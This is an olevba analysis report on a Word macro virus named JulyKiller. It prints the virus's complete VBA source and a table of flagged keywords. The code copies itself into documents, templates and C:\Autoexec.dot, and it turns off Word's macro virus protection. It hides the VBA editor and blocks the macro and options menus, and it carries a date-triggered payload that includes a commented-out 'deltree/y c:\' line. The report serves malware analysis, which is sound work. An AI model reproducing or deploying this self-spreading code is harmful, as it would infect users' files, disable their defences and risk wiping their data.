olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.JulyKiller.c-5c765241e1487235bd7b32bfe88971e167d896b4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.JulyKiller.c-5c765241e1487235bd7b32bfe88971e167d896b4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Y2K.bas 
in file: Virus.MSWord.JulyKiller.c-5c765241e1487235bd7b32bfe88971e167d896b4 - OLE stream: 'Macros/VBA/Y2K'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub actNo()
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub
Sub Autos()
    Dim file$
    Dim ans$
    Dim test
    Dim mItem
    Dim cItem
    Dim aDoc
    Dim aTemp
    Dim vset
    Dim Iset
    Dim ad
    Dim y2kDate As Long
    Application.ScreenUpdating = False
    For Each ad In AddIns
    If ad.Name = "Autoexec.dot" Then
        ad.Installed = False
    End If
    Next ad
    With Dialogs(wdDialogToolsOptionsFileLocations)
    .path = "STARTUP-PATH"
    .Setting = "c:\"
    .Execute
    End With
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "Autoexec") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "Y2K") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "Y2K") Then
            vset = 1
        End If
        Next cItem
        If vset <> 1 Then
        'WordBasic.DisableAutoMacros
        Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aDoc.FullName + ":Y2K"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aTemp.FullName + ":Y2K"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
    End If
    
    With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "Autoexec.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
    End With
    If Iset <> 1 Then
        'WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":Y2K", ActiveDocument.FullName + ":Y2K"
        ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
        ActiveDocument.Close
    End If

    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aDoc
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aTemp
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":Y2K", aDoc.FullName + ":Y2K"
        End If
    Next aDoc
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":Y2K", aTemp.FullName + ":Y2K"
        End If
    Next aTemp
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyZ))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="backy2k"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "×Ô¶¨Ňĺ(&C)..." Then
        mItem.OnAction = "actno"
    End If
    If mItem.Caption = "ÄŁ°ĺşÍĽÓÔŘĎî(&I)..." Then
        mItem.OnAction = "actno"
    End If
    If mItem.Caption = "ŃˇĎî(&O)..." Then
        mItem.OnAction = "actno"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "şę(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "şę(&M)..." Then
                    mItem.OnAction = "actno"
                End If
                If mItem.Caption = "Visual Basic ±ŕĽ­Ć÷(&V)" Then
                    mItem.OnAction = "actno"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "actno"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
Application.ScreenUpdating = True
On Error GoTo Pun
WordBasic.FileSaveAll 1, 1
Pun:
    y2kDate = Int(Now())
    On Error GoTo -1
    On Error GoTo -1
    If y2kDate >= 36526 Then
        If y2kDate = 36526 Or (Rnd() * 100000 Mod 10) = 2 Then
            'Open "C:\autoexec.bat" For Output As 1
            'Print #1, "deltree/y c:\"
            'Close 1
            For Each myTask In Tasks
                If InStr(myTask.Name, "Word") > 0 Then
                    myTask.Visible = False
                End If
            Next myTask
        End If
    End If
End Sub
Sub AutoOpen()
Autos
End Sub
Sub autoclose()
Autos
End Sub
Sub autoNew()
Autos
End Sub
Sub autoexec()
Autos
End Sub
Sub backY2k()
            For Each myTask In Tasks
                If InStr(myTask.Name, "Word") > 0 Then
                    myTask.Visible = True
                End If
            Next myTask

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

